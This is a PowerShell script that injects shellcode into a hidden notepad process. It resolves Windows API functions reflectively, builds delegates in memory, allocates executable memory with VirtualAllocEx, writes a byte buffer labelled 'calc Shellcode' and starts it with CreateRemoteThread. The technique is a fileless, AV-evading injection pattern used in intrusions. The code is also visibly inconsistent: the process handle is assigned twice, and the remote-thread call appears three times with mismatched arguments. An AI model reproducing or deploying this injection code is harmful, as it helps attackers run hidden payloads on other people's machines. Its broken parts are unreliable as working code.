function LookupFunc {
	Param ($moduleName, $functionName)
	
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
	Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
	Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

	$tmp=@()
	$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
@($moduleName)), $functionName))
}

function getDelegateType {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)
	$type = [AppDomain]::CurrentDomain.
	DefineDynamicAssembly((New-Object
	System.Reflection.AssemblyName('ReflectedDelegate')),
	[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
	DefineDynamicModule('InMemoryModule', $false).
	DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$type.DefineConstructor('RtSpecialName, HideBySig, Public',
	[System.Reflection.CallingConventions]::Standard, $func).
	SetImplementationFlags('Runtime, Managed')
	$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
	SetImplementationFlags('Runtime, Managed')
	return $type.CreateType()
}

# Start notepad and get the handle
$hProcess = Start-Process "notepad.exe" -PassThru -WindowStyle Hidden
$hProcess = (Start-Process "C:\Windows\SysWOW64\notepad.exe" -PassThru).handle
Start-Sleep -Seconds 2 # Ensure notepad starts completely
# Get-Process -ID $notepad.id

# calc Shellcode
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8

# Get a handle on the notepad process with OpenProcess
# $hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr]))).Invoke(0x001F0FFF, $false, $notepad.id)

# allocate memory in notepad
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), (getDelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, $buf.Length, 0x3000, 0x40)

# Copy shellcode to buffer with WriteProcessMemory
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($hProcess, $lpMem, $buf, $buf.Length, [Ref] 0) | Out-Null

# Execute shellcode as remote thread
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0, $lpMem, 0, [IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, $null, $lpMem, 0, 0, [IntPtr]::Zero)
	
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, $null, $lpMem, 0, [IntPtr]::Zero, [IntPtr]::Zero)